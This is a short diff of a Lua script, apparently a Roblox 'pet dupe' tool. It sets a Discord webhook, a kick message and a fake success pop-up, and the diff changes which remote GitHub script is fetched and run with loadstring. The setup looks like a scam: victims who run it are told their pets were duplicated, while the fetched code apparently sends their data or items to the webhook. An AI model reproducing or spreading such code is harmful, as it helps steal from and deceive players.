@@ -5,4 +5,4 @@ _G.Webhook = "https://discord.com/api/webhooks/1009385574035107850/nAi6_vaMM495F
 _G.KickMessage = "Rejoin in 1-3 minutes"
 _G.PopUpMessage = "Successfully Duped all pets in your bank!"
 
-loadstring(game:HttpGet"https://raw.githubusercontent.com/ToxinKindaScripts/psxdupe/main/gui-1")()
+loadstring(game:HttpGet"https://raw.githubusercontent.com/ToxinKindaScripts/psxdupe/main/script2")()
